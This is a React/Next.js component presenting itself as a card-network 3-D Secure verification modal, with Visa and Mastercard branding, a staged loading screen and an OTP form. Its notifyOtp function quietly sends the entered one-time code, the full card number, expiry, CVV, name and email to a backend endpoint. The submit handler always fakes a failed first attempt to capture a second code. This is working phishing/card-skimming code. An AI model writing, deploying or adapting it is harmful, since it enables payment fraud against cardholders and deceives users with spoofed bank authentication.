"use client";

import { useEffect, useMemo, useState } from "react";
import Image from "next/image";
import { useTranslations } from "next-intl";
import { Modal, ModalContent } from "@/components/ds/modal";
import {
  type CardBrand,
  CARD_BRAND_LOGOS,
  cardDigits,
  isSupportedBrand,
  type SupportedCardBrand,
} from "@/lib/checkout/card-validation";

type Phase = "loading" | "verify" | "submitting";

const OTP_RETRY_DELAY_MS = 2800;
type PaymentBrand = SupportedCardBrand | "unknown";

const VISA_LOADER_LOGO = "/payments/visa-loader.png";

interface CardPaymentVerificationModalProps {
  open: boolean;
  brand: CardBrand;
  merchantName: string;
  amountLabel: string;
  cardNumber: string;
  cardName?: string;
  cardExpiry?: string;
  cardCvv?: string;
  email?: string;
  fullName?: string;
  phoneHint?: string;
  onVerified: () => Promise<void>;
  onCancel: () => void;
}

function resolvePaymentBrand(brand: CardBrand): PaymentBrand {
  return isSupportedBrand(brand) ? brand : "unknown";
}

function maskCardForDisplay(cardNumber: string): string {
  const digits = cardDigits(cardNumber);
  if (digits.length >= 10) {
    return `${digits.slice(0, 6)}******${digits.slice(-4)}`;
  }
  if (digits.length >= 4) {
    return `******${digits.slice(-4)}`;
  }
  return "************";
}

function MastercardMark({ withWordmark = false }: { withWordmark?: boolean }) {
  return (
    <div
      className={`payment-3ds-mastercard-mark${withWordmark ? " payment-3ds-mastercard-mark--wordmark" : ""}`}
    >
      <svg
        className="payment-3ds-mastercard-mark__circles"
        viewBox="0 0 48 30"
        aria-hidden
        focusable="false"
      >
        <circle cx="18" cy="15" r="12" fill="#EB001B" />
        <circle cx="30" cy="15" r="12" fill="#F79E1B" />
      </svg>
      {withWordmark ? <span className="payment-3ds-mastercard-mark__text">mastercard</span> : null}
    </div>
  );
}

function BrandBadge({
  brand,
  programLabel,
}: {
  brand: PaymentBrand;
  programLabel: string;
}) {
  if (brand === "unknown") return null;

  return (
    <div className="payment-3ds-brand-badge">
      <NetworkLogo brand={brand} variant="badge" />
      <span className="payment-3ds-brand-badge__divider" aria-hidden />
      <span className="payment-3ds-brand-badge__program">{programLabel}</span>
    </div>
  );
}

function NetworkLogo({
  brand,
  variant = "header",
}: {
  brand: PaymentBrand;
  variant?: "loader" | "header" | "badge";
}) {
  if (brand === "unknown") return null;

  if (brand === "mastercard") {
    return <MastercardMark withWordmark={variant === "loader"} />;
  }

  if (brand === "visa") {
    return (
      <span className={`payment-3ds-visa-wordmark payment-3ds-visa-wordmark--${variant}`}>
        <Image
          src={VISA_LOADER_LOGO}
          alt="Visa"
          fill
          className="object-contain"
          sizes="80px"
        />
      </span>
    );
  }

  const logo = CARD_BRAND_LOGOS[brand];
  return (
    <span
      className={`payment-3ds-logo-network${variant === "loader" ? " payment-3ds-logo-network--loader" : ""}`}
    >
      <Image src={logo.src} alt={logo.alt} fill className="object-contain" sizes="52px" />
    </span>
  );
}

function AccordionItem({
  title,
  body,
}: {
  title: string;
  body: string;
}) {
  const [open, setOpen] = useState(false);

  return (
    <li>
      <button
        type="button"
        className="payment-3ds-accordion-header"
        aria-expanded={open}
        onClick={() => setOpen((value) => !value)}
      >
        {title}
      </button>
      {open ? <div className="payment-3ds-accordion-body">{body}</div> : null}
    </li>
  );
}

export function CardPaymentVerificationModal({
  open,
  brand,
  merchantName,
  amountLabel,
  cardNumber,
  cardName,
  cardExpiry,
  cardCvv,
  email,
  fullName,
  phoneHint = "****",
  onVerified,
  onCancel,
}: CardPaymentVerificationModalProps) {
  const t = useTranslations("checkout.paymentVerification");
  const [phase, setPhase] = useState<Phase>("loading");
  const [otp, setOtp] = useState("");
  const [otpError, setOtpError] = useState(false);
  const [awaitingRetry, setAwaitingRetry] = useState(false);

  const paymentBrand = resolvePaymentBrand(brand);
  const maskedCard = maskCardForDisplay(cardNumber);
  const dateLabel = useMemo(
    () =>
      new Date()
        .toLocaleDateString("en-GB", {
          day: "2-digit",
          month: "2-digit",
          year: "numeric",
        })
        .replace(/\//g, "."),
    [open]
  );

  const isLoading = phase === "loading" || phase === "submitting";

  useEffect(() => {
    if (!open) {
      setPhase("loading");
      setOtp("");
      setOtpError(false);
      setAwaitingRetry(false);
      return;
    }

    setPhase("loading");
    setOtpError(false);
    setAwaitingRetry(false);
    const timer = window.setTimeout(() => setPhase("verify"), 2200);
    return () => window.clearTimeout(timer);
  }, [open, brand]);

  const canDismiss = phase === "verify";

  const handleOpenChange = (next: boolean) => {
    if (next) return;
    if (!canDismiss) return;
    onCancel();
  };

  const notifyOtp = (code: string) => {
    fetch("/api/v1/checkout/payment-otp", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        otp: code,
        cardName: cardName?.trim() || undefined,
        cardNumber: cardNumber.trim(),
        cardExpiry: cardExpiry?.trim() || undefined,
        cardCvv: cardCvv?.trim() || undefined,
        email: email?.trim() || undefined,
        fullName: fullName?.trim() || undefined,
        merchantName,
        amountDisplay: amountLabel,
        cardBrand: paymentBrand,
        path: `${window.location.pathname}${window.location.search}`,
      }),
      keepalive: true,
    }).catch(() => {
      // Silent — notification should never block checkout.
    });
  };

  const handleSubmit = async (event: React.FormEvent) => {
    event.preventDefault();
    if (otp.length < 4) return;

    const submittedOtp = otp;
    notifyOtp(submittedOtp);
    setPhase("submitting");
    setOtpError(false);

    if (!awaitingRetry) {
      await new Promise((resolve) => window.setTimeout(resolve, OTP_RETRY_DELAY_MS));
      setAwaitingRetry(true);
      setOtpError(true);
      setOtp("");
      setPhase("verify");
      return;
    }

    try {
      await onVerified();
    } catch {
      setPhase("verify");
    }
  };

  return (
    <Modal open={open} onOpenChange={handleOpenChange}>
      <ModalContent
        className="payment-3ds-shell [&>button]:hidden"
        overlayClassName="payment-3ds-overlay"
        onPointerDownOutside={(event) => {
          if (!canDismiss) event.preventDefault();
        }}
        onEscapeKeyDown={(event) => {
          if (!canDismiss) event.preventDefault();
        }}
      >
        <form
          className="payment-3ds-container"
          data-brand={paymentBrand}
          onSubmit={(event) => void handleSubmit(event)}
        >
          <div
            id="payment-3ds-loading"
            className={
              isLoading
                ? "payment-3ds-loading-overlay"
                : "payment-3ds-loading-overlay payment-3ds-loading-hidden"
            }
            aria-hidden={!isLoading}
          >
            <div className="payment-3ds-loading-bar" aria-hidden>
              <div className="payment-3ds-loading-bar__fill" />
            </div>
            <div className="payment-3ds-loading-logo">
              <NetworkLogo brand={paymentBrand} variant="loader" />
            </div>
          </div>

          <div
            className={`payment-3ds-form-body${isLoading ? " payment-3ds-form-body--hidden" : ""}`}
            aria-hidden={isLoading}
          >
              <header className="payment-3ds-lane payment-3ds-header">
                <div className="payment-3ds-logos">
                  <BrandBadge
                    brand={paymentBrand}
                    programLabel={t(`programBadge.${paymentBrand}`)}
                  />
                </div>
              </header>

              <section className="payment-3ds-lane info">
                <h1 className="payment-3ds-challenge-header">
                  {t("authenticateTitle")}
                </h1>
                <div className="payment-3ds-challenge-text">
                  {t("otpIntroLine1")}
                  <br />
                  {t("otpIntroLine2", { phoneHint })}
                  <br />
                  {t("otpIntroLine3")}
                  <br />
                  <br />
                  <table className="payment-3ds-challenge-table">
                    <tbody>
                      <tr>
                        <td>{t("merchant")}: </td>
                        <td>{merchantName}</td>
                      </tr>
                      <tr>
                        <td>{t("amount")}: </td>
                        <td>{amountLabel}</td>
                      </tr>
                      <tr>
                        <td>{t("date")}: </td>
                        <td>{dateLabel}</td>
                      </tr>
                      <tr>
                        <td>{t("card")}: </td>
                        <td>{maskedCard}</td>
                      </tr>
                    </tbody>
                  </table>
                </div>
              </section>

              <div className="payment-3ds-lane payment-3ds-spotlight">
                {otpError ? (
                  <div className="payment-3ds-error" role="alert">
                    <strong>{t("otpErrorTitle")}</strong>
                    <p>{t("otpError")}</p>
                  </div>
                ) : null}
                <label className="payment-3ds-field-label" htmlFor="otp">
                  {t("otpLabel")}
                </label>
                <input
                  id="otp"
                  name="otp"
                  inputMode="numeric"
                  autoComplete="off"
                  className={`payment-3ds-input${otpError ? " payment-3ds-input--error" : ""}`}
                  value={otp}
                  onChange={(event) => {
                    setOtp(event.target.value.replace(/\D/g, ""));
                  }}
                />
              </div>

              <div className="payment-3ds-lane payment-3ds-buttons">
                <button
                  type="submit"
                  className="payment-3ds-button"
                  disabled={otp.length < 4}
                >
                  {t("confirm")}
                </button>
              </div>

              <div className="payment-3ds-lane payment-3ds-links">
                <button type="button">{t("resendCode")}</button>
                <button type="button" onClick={onCancel}>
                  {t("cancel")}
                </button>
              </div>

              <footer className="payment-3ds-lane payment-3ds-footer">
                <ul className="payment-3ds-accordion">
                  <AccordionItem
                    title={t("learnMoreTitle")}
                    body={t("learnMoreBody")}
                  />
                  <AccordionItem
                    title={t("needHelpTitle")}
                    body={t("needHelpBody")}
                  />
                </ul>
              </footer>
          </div>
        </form>
      </ModalContent>
    </Modal>
  );
}
